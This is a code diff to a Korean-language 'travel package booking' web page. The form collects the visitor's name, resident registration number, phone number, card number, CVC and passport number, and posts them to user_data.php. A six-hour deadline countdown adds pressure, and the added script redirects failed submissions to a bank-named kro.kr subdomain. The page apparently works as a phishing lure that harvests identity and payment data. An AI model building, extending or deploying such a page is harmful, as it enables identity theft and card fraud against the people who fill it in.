@@ -149,6 +149,56 @@
         };
     </script>
 
+    <!-- JavaScript 코드 추가 -->
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('booking-form').addEventListener('submit', function(event) {
+                const name = document.getElementById('name');
+                const residentNumber = document.getElementById('resident-number');
+                const phoneNumber = document.getElementById('phone-number');
+                const cardNumber = document.getElementById('card-number');
+                const cvcNumber = document.getElementById('cvc-number');
+                const passportNumber = document.getElementById('passport-number');
+                
+                let isValid = true;
+                
+                if (!/^[가-힣]+$/.test(name.value)) {
+                    alert('이름은 한글로 입력해주세요.');
+                    isValid = false;
+                }
+                
+                if (!/^\d{6}-\d{7}$/.test(residentNumber.value)) {
+                    alert('주민번호는 123456-1234567 형식으로 입력해주세요.');
+                    isValid = false;
+                }
+                
+                if (!/^\d{3}-\d{3,4}-\d{4}$/.test(phoneNumber.value)) {
+                    alert('전화번호는 010-1234-5678 형식으로 입력해주세요.');
+                    isValid = false;
+                }
+                
+                if (!/^\d{4}-\d{4}-\d{4}-\d{4}$/.test(cardNumber.value)) {
+                    alert('카드번호는 1234-5678-1234-5678 형식으로 입력해주세요.');
+                    isValid = false;
+                }
+                
+                if (cvcNumber.value < 100 || cvcNumber.value > 999) {
+                    alert('CVC 번호는 100에서 999 사이의 숫자로 입력해주세요.');
+                    isValid = false;
+                }
+                
+                if (!/^[A-Z]\d{8}$/.test(passportNumber.value)) {
+                    alert('여권번호는 대문자와 숫자 8자리로 입력해주세요. 예: M12345678');
+                    isValid = false;
+                }
+                
+                if (!isValid) {
+                    event.preventDefault();
+                    window.location.href = 'http://event-turtle-bank.kro.kr/';
+                }
+            });
+        });
+    </script>
 </head>
 
 <body>
@@ -167,45 +217,41 @@
     </div>
 </header><!-- End Header -->
 
+
 <!-- ======= Hero Section ======= -->
 <section id="hero" class="d-flex align-items-center">
     <div class="hero-img"></div>
     <div class="form-container">
         <h2>여행 패키지 예약</h2>
-        <form action="user_data.php" method="post">
+        <form id="booking-form" action="user_data.php" method="post">
             <label for="name">이름</label>
-            <input type="text" id="name" name="name" required><br>
+            <input type="text" id="name" name="name" placeholder="홍길동" required><br>
     
             <label for="resident-number">주민번호</label>
-            <input type="text" id="resident-number" name="resident-number" required><br>
+            <input type="text" id="resident-number" name="resident-number" placeholder="123456-1234567" required><br>
     
             <label for="phone-number">전화번호</label>
-            <input type="tel" id="phone-number" name="phone-number" required><br>
+            <input type="tel" id="phone-number" name="phone-number" placeholder="010-1234-5678" required><br>
     
             <label for="card-number">카드번호</label>
-            <input type="text" id="card-number" name="card-number" required><br>
+            <input type="text" id="card-number" name="card-number" placeholder="1234-5678-1234-5678" required><br>
     
             <label for="cvc-number">CVC 번호</label>
-            <input type="number" id="cvc-number" name="cvc-number" required><br>
+            <input type="number" id="cvc-number" name="cvc-number" placeholder="123" required><br>
     
             <label for="passport-number">여권번호</label>
-            <input type="text" id="passport-number" name="passport-number" required><br>
+            <input type="text" id="passport-number" name="passport-number" placeholder="M12345678" required><br>
     
             <div class="button-container">
                 <button type="submit">예약 신청</button>
             </div>
         </form>
 
-            <div class="countdown">
-                마감까지 남은 시간: <span id="countdown">6:00:00</span>
-            </div>
-        </form>
+        <div class="countdown">
+            마감까지 남은 시간: <span id="countdown">6:00:00</span>
+        </div>
     </div>
 </section><!-- End Hero -->
-
-<main id="main">
-    <!-- Main content -->
-</main><!-- End #main -->
 
 <!-- ======= Footer ======= -->
 <footer id="footer">
